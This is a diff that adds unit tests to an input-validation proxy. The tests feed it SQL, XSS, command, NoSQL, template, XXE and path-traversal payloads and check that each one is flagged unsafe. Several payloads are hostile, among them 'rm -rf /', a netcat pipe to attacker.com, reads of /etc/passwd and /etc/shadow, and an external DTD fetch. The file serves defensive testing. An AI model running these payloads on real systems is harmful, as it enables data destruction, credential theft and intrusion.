@@ -130,5 +130,212 @@ class TestSecureInputProxy(unittest.TestCase):
             # This accommodates different response formats between analyzers
             pass
 
+    # Enhanced code injection detection tests
+    def test_sql_injection_detection(self):
+        """Test SQL injection attempt detection"""
+        sql_attacks = [
+            "SELECT * FROM users WHERE id = '1' OR 1=1--",
+            "admin' UNION SELECT password FROM users--",
+            "'; DROP TABLE users; --",
+            "' OR '1'='1",
+            "test'; exec xp_cmdshell('dir')--"
+        ]
+        
+        for attack in sql_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"SQL injection test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if SQL injection was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_sql_detection = any("SQL injection" in str(issue) for issue in issues)
+                    self.assertTrue(has_sql_detection, f"SQL injection not detected in issues: {issues}")
+
+    def test_xss_detection(self):
+        """Test XSS attack detection"""
+        xss_attacks = [
+            "<script>alert('XSS')</script>",
+            "javascript:alert('XSS')",
+            "<img src=x onerror=alert('XSS')>",
+            "<div onclick='alert(\"XSS\")'>Click me</div>",
+            "document.write('<script>alert(\"XSS\")</script>')"
+        ]
+        
+        for attack in xss_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"XSS test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if XSS was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_xss_detection = any("XSS" in str(issue) for issue in issues)
+                    self.assertTrue(has_xss_detection, f"XSS not detected in issues: {issues}")
+
+    def test_command_injection_detection(self):
+        """Test command injection detection"""
+        cmd_attacks = [
+            "test; rm -rf /",
+            "file.txt & echo 'injected'",
+            "data | nc attacker.com 1234",
+            "input; cat /etc/passwd",
+            "$(whoami)",
+            "`id`"
+        ]
+        
+        for attack in cmd_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"Command injection test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if command injection was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_cmd_detection = any("command injection" in str(issue) for issue in issues)
+                    self.assertTrue(has_cmd_detection, f"Command injection not detected in issues: {issues}")
+
+    def test_nosql_injection_detection(self):
+        """Test NoSQL injection detection"""
+        nosql_attacks = [
+            '{"username": {"$ne": null}, "password": {"$ne": null}}',
+            '{"$where": "this.username == this.password"}',
+            'admin"; return true; var x="',
+            '{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}'
+        ]
+        
+        for attack in nosql_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"NoSQL injection test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if NoSQL injection was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_nosql_detection = any("NoSQL injection" in str(issue) for issue in issues)
+                    self.assertTrue(has_nosql_detection, f"NoSQL injection not detected in issues: {issues}")
+
+    def test_path_traversal_detection(self):
+        """Test path traversal detection"""
+        path_attacks = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "/etc/shadow",
+            "C:\\windows\\system32\\drivers\\etc\\hosts"
+        ]
+        
+        for attack in path_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"Path traversal test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if path traversal was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_path_detection = any("path traversal" in str(issue) for issue in issues)
+                    self.assertTrue(has_path_detection, f"Path traversal not detected in issues: {issues}")
+
+    def test_template_injection_detection(self):
+        """Test template injection detection"""
+        template_attacks = [
+            "{{7*7}}",
+            "${7*7}",
+            "<%=7*7%>",
+            "#{7*7}",
+            "${__import__('os').system('id')}"
+        ]
+        
+        for attack in template_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"Template injection test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if template injection was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_template_detection = any("template injection" in str(issue) for issue in issues)
+                    self.assertTrue(has_template_detection, f"Template injection not detected in issues: {issues}")
+
+    def test_code_execution_detection(self):
+        """Test code execution function detection"""
+        exec_attacks = [
+            "system('rm -rf /')",
+            "exec('whoami')",
+            "eval('malicious_code')",
+            "__import__('os').system('id')",
+            "shell_exec('cat /etc/passwd')",
+            "mkdir('/tmp/malicious')"
+        ]
+        
+        for attack in exec_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"Code execution test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if code execution was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_exec_detection = any("code execution" in str(issue) or "Suspicious function" in str(issue) for issue in issues)
+                    self.assertTrue(has_exec_detection, f"Code execution not detected in issues: {issues}")
+
+    def test_xml_xxe_detection(self):
+        """Test XML/XXE injection detection"""
+        xml_attacks = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
+            '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'
+        ]
+        
+        for attack in xml_attacks:
+            with self.subTest(attack=attack):
+                response = requests.post(f"{self.base_url}/validate",
+                    json={"text": attack, "security_level": "high"}
+                )
+                self.assertEqual(response.status_code, 200)
+                result = response.json()
+                print(f"XML/XXE test result for '{attack}': {result}")
+                self.assertEqual(result["status"], "unsafe")
+                
+                # Check if XML/XXE was detected
+                if "detected_issues" in result:
+                    issues = result["detected_issues"]
+                    has_xml_detection = any("XML" in str(issue) or "XXE" in str(issue) for issue in issues)
+                    self.assertTrue(has_xml_detection, f"XML/XXE not detected in issues: {issues}")
+
 if __name__ == "__main__":
     unittest.main()
